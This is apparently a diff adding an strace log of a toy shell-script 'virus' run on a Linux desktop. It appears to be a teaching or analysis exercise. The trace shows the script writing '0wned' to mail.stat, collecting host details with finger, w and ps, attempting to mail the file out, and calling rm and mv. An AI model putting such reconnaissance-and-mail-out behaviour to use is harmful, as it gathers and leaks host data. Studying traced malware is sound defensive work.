@@ -1,0 +1,221 @@
+execve("./virus", ["./virus"], 0x7ffe91f62770 /* 60 vars */) = 0
+brk(NULL)                               = 0x55e7ac42f000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd903e1120) = -1 EINVAL (无效的参数)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (没有那个文件或目录)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=105266, ...}) = 0
+mmap(NULL, 105266, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3aebd98000
+close(3)                                = 0
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libkysec.so.0", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0&\0\0\0\0\0\0"..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0644, st_size=27160, ...}) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f3aebd96000
+mmap(NULL, 30552, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f3aebd8e000
+mmap(0x7f3aebd90000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f3aebd90000
+mmap(0x7f3aebd93000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f3aebd93000
+mmap(0x7f3aebd94000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f3aebd94000
+close(3)                                = 0
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\360q\2\0\0\0\0\0"..., 832) = 832
+pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32, 848) = 32
+pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0T\354 ]\252R\353S\274q\317Gv\233\276\341"..., 68, 880) = 68
+fstat(3, {st_mode=S_IFREG|0755, st_size=2029224, ...}) = 0
+pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32, 848) = 32
+pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0T\354 ]\252R\353S\274q\317Gv\233\276\341"..., 68, 880) = 68
+mmap(NULL, 2036952, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f3aebb9c000
+mprotect(0x7f3aebbc1000, 1847296, PROT_NONE) = 0
+mmap(0x7f3aebbc1000, 1540096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7f3aebbc1000
+mmap(0x7f3aebd39000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19d000) = 0x7f3aebd39000
+mmap(0x7f3aebd84000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f3aebd84000
+mmap(0x7f3aebd8a000, 13528, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f3aebd8a000
+close(3)                                = 0
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libkysec_log.so.0", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0`\23\0\0\0\0\0\0"..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0644, st_size=14792, ...}) = 0
+mmap(NULL, 16792, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f3aebb97000
+mmap(0x7f3aebb98000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1000) = 0x7f3aebb98000
+mmap(0x7f3aebb99000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f3aebb99000
+mmap(0x7f3aebb9a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f3aebb9a000
+close(3)                                = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f3aebb94000
+arch_prctl(ARCH_SET_FS, 0x7f3aebb94740) = 0
+mprotect(0x7f3aebd84000, 12288, PROT_READ) = 0
+mprotect(0x7f3aebb9a000, 4096, PROT_READ) = 0
+mprotect(0x7f3aebd94000, 4096, PROT_READ) = 0
+mprotect(0x55e7ac0ae000, 8192, PROT_READ) = 0
+mprotect(0x7f3aebddf000, 4096, PROT_READ) = 0
+munmap(0x7f3aebd98000, 105266)          = 0
+getuid()                                = 1000
+getgid()                                = 1000
+getpid()                                = 66565
+rt_sigaction(SIGCHLD, {sa_handler=0x55e7ac0a3ca0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f3aebbe2210}, NULL, 8) = 0
+geteuid()                               = 1000
+brk(NULL)                               = 0x55e7ac42f000
+brk(0x55e7ac450000)                     = 0x55e7ac450000
+getppid()                               = 66562
+stat("/home/jasper/\346\241\214\351\235\242", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+openat(AT_FDCWD, "./virus", O_RDONLY)   = 3
+openat(AT_FDCWD, "/sys/kernel/security/kysec/status", O_RDONLY) = -1 ENOENT (没有那个文件或目录)
+fcntl(3, F_DUPFD, 10)                   = 10
+close(3)                                = 0
+fcntl(10, F_SETFD, FD_CLOEXEC)          = 0
+geteuid()                               = 1000
+getegid()                               = 1000
+rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigaction(SIGINT, {sa_handler=0x55e7ac0a3ca0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f3aebbe2210}, NULL, 8) = 0
+rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f3aebbe2210}, NULL, 8) = 0
+rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f3aebbe2210}, NULL, 8) = 0
+read(10, "#!/bin/sh\necho '0wned'>>mail.sta"..., 8192) = 269
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+write(1, "0wned\n", 6)                  = 6
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+write(1, "HOST DET:\n", 10)             = 10
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f3aebb94a10) = 66566
+wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 66566
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=66566, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 66566
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+stat("/user/lib/ccache/finger", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/sbin/finger", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/bin/finger", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/sbin/finger", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/bin/finger", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/sbin/finger", 0x7ffd903e0db0)    = -1 ENOENT (没有那个文件或目录)
+stat("/bin/finger", 0x7ffd903e0db0)     = -1 ENOENT (没有那个文件或目录)
+stat("/usr/games/finger", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/games/finger", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+write(2, "./virus: 5: ", 12)            = 12
+write(2, "finger: not found", 17)       = 17
+write(2, "\n", 1)                       = 1
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+stat("/user/lib/ccache/w", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/sbin/w", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/bin/w", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/sbin/w", 0x7ffd903e0db0)     = -1 ENOENT (没有那个文件或目录)
+stat("/usr/bin/w", {st_mode=S_IFREG|0755, st_size=22760, ...}) = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f3aebb94a10) = 66567
+wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 66567
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=66567, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 66567
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+stat("/user/lib/ccache/ps", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/sbin/ps", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/bin/ps", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/sbin/ps", 0x7ffd903e0db0)    = -1 ENOENT (没有那个文件或目录)
+stat("/usr/bin/ps", {st_mode=S_IFREG|0755, st_size=137688, ...}) = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f3aebb94a10) = 66568
+wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 66568
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=66568, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 66568
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+write(1, ".\n", 2)                      = 2
+wait4(-1, 0x7ffd903e0cec, WNOHANG, NULL) = -1 ECHILD (没有子进程)
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+fcntl(1, F_DUPFD, 10)                   = 11
+close(1)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 1)                              = 1
+close(3)                                = 0
+write(1, "\n", 1)                       = 1
+dup2(11, 1)                             = 1
+close(11)                               = 0
+openat(AT_FDCWD, "mail.stat", O_RDONLY) = 3
+fcntl(0, F_DUPFD, 10)                   = 11
+close(0)                                = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+dup2(3, 0)                              = 0
+close(3)                                = 0
+stat("/user/lib/ccache/mail", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/sbin/mail", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/bin/mail", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/sbin/mail", 0x7ffd903e0db0)  = -1 ENOENT (没有那个文件或目录)
+stat("/usr/bin/mail", 0x7ffd903e0db0)   = -1 ENOENT (没有那个文件或目录)
+stat("/sbin/mail", 0x7ffd903e0db0)      = -1 ENOENT (没有那个文件或目录)
+stat("/bin/mail", 0x7ffd903e0db0)       = -1 ENOENT (没有那个文件或目录)
+stat("/usr/games/mail", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/games/mail", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+write(2, "./virus: 10: ", 13)           = 13
+write(2, "mail: not found", 15)         = 15
+write(2, "\n", 1)                       = 1
+dup2(11, 0)                             = 0
+close(11)                               = 0
+stat("/user/lib/ccache/rm", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/sbin/rm", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/bin/rm", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/sbin/rm", 0x7ffd903e0db0)    = -1 ENOENT (没有那个文件或目录)
+stat("/usr/bin/rm", {st_mode=S_IFREG|0755, st_size=72056, ...}) = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f3aebb94a10) = 66569
+wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 66569
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=66569, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 66569
+stat("/user/lib/ccache/mv", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/sbin/mv", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/local/bin/mv", 0x7ffd903e0db0) = -1 ENOENT (没有那个文件或目录)
+stat("/usr/sbin/mv", 0x7ffd903e0db0)    = -1 ENOENT (没有那个文件或目录)
+stat("/usr/bin/mv", {st_mode=S_IFREG|0755, st_size=145792, ...}) = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f3aebb94a10) = 66570
+wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 66570
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=66570, si_uid=1000, si_status=1, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 66570
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f3aebb94a10) = 66571
+wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 66571
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=66571, si_uid=1000, si_status=1, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 66571
+read(10, "", 8192)                      = 0
+exit_group(1)                           = ?
++++ exited with 1 +++
